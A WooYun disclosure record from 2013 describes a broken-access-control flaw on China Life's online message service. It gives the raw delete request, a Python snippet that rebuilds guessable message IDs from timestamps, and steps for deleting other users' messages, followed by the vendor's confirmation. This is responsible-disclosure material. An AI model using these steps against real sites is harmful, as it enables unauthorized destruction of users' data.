{"id": 9381, "wybug_id": "wooyun-2013-034163", "wybug_title": "中国人寿平衡权限+信息ID被破解导致删除任意用户数据", "wybug_corp": "中国人寿", "wybug_author": "xfkxfk", "wybug_date": "2013-08-12 16:26", "wybug_open_date": "2013-09-26 16:27", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "逻辑错误", "敏感接口未加权限认证", "安全意识不足", "越权操作", "未授权访问", "认证设计不合理", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-26：\t细节向公众公开  简要描述： 中国人寿某处平衡权限，加上信息ID被破解，构造ID并遍历后，导致可以删除任意用户数据。 详细说明：  这里我们拿两个用户进行测试。先看看用户251362931@qq.com的留言信息，留言ID：137627320480720130812100644：\n\n然后再来看看用户251251251@qq.com的留言信息，留言ID：137627318119420130812100621：\n\n下面我们先来删除用户251251251@qq.com的留言信息，留言ID：137627318119420130812100621，然后我们抓个包看看，请求的参数有哪些：\nPOST /serviceonline/self-service/zaixianliuyan/deleteInfo.jsp HTTP/1.1Host: www.e-chinalife.comProxy-Connection: keep-aliveContent-Length: 65Accept: */*Origin: http://www.e-chinalife.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.e-chinalife.com/serviceonline/self-service/zaixianliuyan/consultation_login.jspAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: eservice=xTbZSL7L8Vw4g**************************RvlmsX6dPdGD!-546834120ecno=1376271645658&serviceid=137627318119420130812100621&status=1\n这里有ecno和serviceid两个主要的参数：\n\n这里的ecno参数可以不要，只是为了区分那个地区的，我主要的参数是serviceid，下面分析一下这留言信息serviceid的构造：他是由27个数字组成，前13个是时间戳，后14个这个时间戳的年月日时分秒格式的时间。所以，只要我们遍历一下时间戳id，然后利用下面代码构造出这个serviceid就ok了。\nimport timeid='1376273204807'tmp_time = float(id[0:10] + '.' + id[10:])date = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(tmp_time))date_str = date[0:4]+date[5:7]+date[8:10]+str(int(date[11:13])+8)+date[14:16]+date[17:]serviceid = id + date_strprint \"serviceid=%s\" % serviceid\n通过上面分析，我们在删除留言信息时，抓包，把ecno参数删掉，把serviceid参数的值换成用户251362931@qq.com的留言信息，留言ID：137627320480720130812100644：\n\n然后确定删除：\n\n\n\n最后用户251362931@qq.com的留言信息，留言ID：137627320480720130812100644的留言就被删掉了。看看是否删除成功：\n\n用户251362931@qq.com的留言信息，留言ID：137627320480720130812100644被删除。\n\n原本用户251251251@qq.com的留言信息，留言ID：137627318119420130812100621依然在，没有删除。这样我们只要遍历时间戳（time.time()），利用上面代码构造serviceid，就能删除所有用户的留言信息。   漏洞证明：  见详细说明   修复方案：  控制权限，用户只能删除自己的留言信息。留言信息ID不可逆，不要被破解出来，导致操作全部信息。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-08-12 17:39 厂商回复： 非常感谢您对中国人寿信息安全的帮助，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}